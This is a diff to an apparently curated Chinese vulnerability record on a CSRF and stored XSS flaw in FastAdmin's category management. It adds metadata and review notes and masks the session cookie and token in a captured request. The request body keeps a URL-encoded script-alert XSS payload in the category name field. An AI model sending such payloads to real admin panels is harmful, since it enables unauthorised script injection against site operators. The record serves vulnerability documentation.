@@ -1,6 +1,38 @@
 ---
 source: "hatch 补库批 20260928"
+product: "FastAdmin category management"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "FastAdmin csrf+存储型xss漏洞"
+prerequisites: "来源所述条件，未列明部分仍待核：V1.0.0.20200506_beta; logged-in admin victim"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "unknown"
+id: "vw-1998a6d57843f2b16dfdef3d"
+entity_id: "ve-1998a6d57843f2b16dfdef3d"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：V1.0.0.20200506_beta; logged-in admin victim
+
+代码与实验材料：Captured request and HTML form; screenshot outcomes; original cookie/token should be sanitized; browser SameSite/CSRF conditions absent
+
+来源证据范围：Official repo issue67
+
+- **结论使用边界（1）**：No response/render sink detail or fixed release; captured XHR headers differ from cross-origin form capability。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # FastAdmin csrf+存储型xss漏洞
 
@@ -27,7 +59,7 @@ V1.0.0.20200506\_beta
     Origin: https://www.0-sec.org
     Connection: close
     Referer: http://admin.com/admin.php/category/add?dialog=1
-    Cookie: PHPSESSID=ou6fjfn717lu02rfm9saqguca4; uid=3; token=f824ac8c-ac7b-4979-a89b-b47dd8e79226
+    Cookie: PHPSESSID=ou6********************ca4; uid=3; token=f82******************************226
 
     row%5Btype%5D=default&row%5Bpid%5D=0&row%5Bname%5D=%3Cscript%3Ealert(1)%3C%2Fscript%3E&row%5Bnickname%5D=123&row%5Bimage%5D=1&row%5Bkeywords%5D=123&row%5Bdescription%5D=123&row%5Bweigh%5D=0&row%5Bstatus%5D=normal&row%5Bflag%5D%5B%5D=
 
